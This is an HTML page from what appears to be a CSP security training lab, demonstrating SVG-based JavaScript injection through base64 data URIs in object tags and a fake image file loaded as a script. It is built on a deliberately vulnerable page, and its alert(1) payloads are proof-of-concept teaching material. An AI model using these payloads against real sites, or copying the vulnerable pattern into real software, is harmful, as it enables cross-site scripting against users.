<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	
	<title>CSP Attacks</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<meta name="generator" content="CSP Attacks">
	<meta name="viewport" content="width=device-width">
</head>

<body>
<div class="wrapper">
	<?php include "navi.html";?>


	<div id="content">
<h1>Embedded Images - SVG Javascript injection</h1>
Hello there,
<script src="js/02a_domjs_docwrite.js" type="text/javascript"></script>
<br><br>
This is the same site as 02.A - however, this time we try to inject a base64 encoded svg with embedded javascript.
<br>For this purpose, the "data:" option has been added to the object-src section of our CSP. <br>This allows us to specify images as data in an object-tag, instead of an image source.<br><br>
<br>
<h3>Attack Examples:</h3>
Here are a two examples of SVGs, an image without javascript and the same image with JS.
<br><b>Green Bar</b><br>
Append this to the URL ?name=... and you should see a green box appear.
<xmp><object data='data:image/jpeg;base64,PD94bWwgdmVyc2lvbj0iMS4wIj8+CjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIKICAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4KIAo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgdmVyc2lvbj0iMS4xIgogICAgICB3aWR0aD0iMTIwIiBoZWlnaHQ9IjEyMCIgdmlld0JveD0iMCAwIDIzNiAxMjAiPgogIDxyZWN0IHg9IjE0IiB5PSIyMyIgd2lkdGg9IjI1MCIgaGVpZ2h0PSI3NyIgZmlsbD0ibGltZSIKICAgICAgc3Ryb2tlPSJibGFjayIgc3Ryb2tlLXdpZHRoPSIxIiAvPgo8L3N2Zz4='/></xmp>

<br><b>Green Bar with JS</b><br>
Same as above, however if you open your browser console you should see an inline CSP violation
<xmp><object data='data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIj8+CjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIKICAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4KIAo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgdmVyc2lvbj0iMS4xIgogICAgICB3aWR0aD0iMTIwIiBoZWlnaHQ9IjEyMCIgdmlld0JveD0iMCAwIDIzNiAxMjAiPgogIDxyZWN0IHg9IjE0IiB5PSIyMyIgd2lkdGg9IjI1MCIgaGVpZ2h0PSI3NyIgZmlsbD0ibGltZSIKICAgICAgc3Ryb2tlPSJibGFjayIgc3Ryb2tlLXdpZHRoPSIxIiAvPgogIDxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD4KPC9zdmc+' type="image/svg+xml"></object></xmp>

<br><b>SVG Code 1</b><br>
This is the image without JS (save the code as a .svg file)
<xmp><svg xmlns="http://www.w3.org/2000/svg" version="1.1"
      width="120" height="120" viewBox="0 0 236 120">
  <rect x="14" y="23" width="250" height="77" fill="lime"
      stroke="black" stroke-width="1" />
</svg>
</xmp>

<br><b>SVG Code 2</b><br>
This is the image with JS
<xmp><svg xmlns="http://www.w3.org/2000/svg" version="1.1"
      width="120" height="120" viewBox="0 0 236 120">
  <rect x="14" y="23" width="250" height="77" fill="lime"
      stroke="black" stroke-width="1" />
  <script>alert(1)</script>
</svg></xmp>
<br><br><h3>IMG Upload</h3>
There is one more attack that is possible if a website has an image upload feature and doesn't check uploaded files properly. Meaning for example, that the feature only checks if the file ends in .jpg but not if the content is actually an image. An attacker could upload a file called image.jpg containing javascript.<br><br>
For testing purposes, there is an image called evil.jpg in /data/images/ containing the line 'alert(1);'.<br>
<br>
Just like in the JSON attack before, Chrome blocks loading images as javascript files due to strict MIME-Type checking, but FireFox doesn't. That of course means that if such a "image" could be uploaded, it could also be used to XSS FireFox users. <xmp>?user=bob<script src="data/images/evil.jpg"></script></xmp>

If course, the image itself can't be used as such, unless you inject the JS into a real image in a way that leaves both image and js fully functional. <a href="http://ha.ckers.org/blog/20070623/hiding-js-in-valid-images/">This is possible with .gif files</a>.<br>
<img src="data/images/P08-01_evil-images.png">
<br>
<br>
<br>
<p><a href="http://www.twitter.com/HashtagSecurity">@HashtagSecurity</a> - <a href="http://www.hashtagsecurity.com/csp">Blogpost</a></p>
</div>
</div>

</body>
</html>
